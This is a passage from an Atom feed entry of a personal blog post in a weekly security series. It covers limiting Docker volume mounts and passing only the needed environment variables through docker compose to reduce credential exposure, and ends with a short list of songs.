+&lt;p&gt;This doesn’t provide a perfectly secure way of storing credentials, but instead changes the necessary attack chain from compromising source code for a particular instance of an application, instead necessitating compromising an application while it’s running in production, or accessing whatever escrow the deployment-specific &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; is stored in.&lt;/p&gt;
+
+&lt;p&gt;It is possible to map directories from the host of an image to the file system of the guest image under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;volumes&lt;/code&gt; tag. In my example, I’ve mapped the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./src/&lt;/code&gt; from the project directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/app/&lt;/code&gt; on the image. Developers should take care to make sure no non-essential data is being mounted to the image, so that if an attacker were to somehow gain command line access to an image or execute a path traversal attack, sensitive data wouldn’t be leaked. In my setup, I don’t use all the values of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt;, instead I pass the necessary environment variables through the docker compose file. This means unused environment variables are not exposed to images, protecting them if an image gets compromised.&lt;/p&gt;
+
+&lt;p&gt;I’m curious to know if a simple docker compose file can be configured to provide load balancing in the event of a backend crashing, or if that functionality can only come with a container orchestration platform like Red Hat’s OpenShift.&lt;/p&gt;
+&lt;h3 id=&quot;new-music-i-listened-to-this-week&quot;&gt;New music I listened to this week&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://open.spotify.com/track/4feXcsElKIVsGwkbnTHAfV?si=7bee50b3b1ba48b8&quot;&gt;Somethin’ Stupid&lt;/a&gt; by Frank and Nancy Sinatra
+&lt;a href=&quot;https://open.spotify.com/track/6j5LtifAnuTjTYvml61yFZ?si=86c27fd0a8764d3b&quot;&gt;Un Millón de Primaveras&lt;/a&gt; by Vicente Fernandez&lt;/p&gt;</content><author><name>Jake Mullins</name></author><category term="year-of-hacking" /><category term="development" /><summary type="html">I’m setting out to write a short blog post every week about whatever Cybersecurity or information security related topic I’m working on. There will likely be repeats, and cop-outs where I can’t post source code because it’s linked to a school assignment, and more than a few weeks that aren’t related to security. Hopefully they will be published each Monday for the next year.</summary></entry></feed>
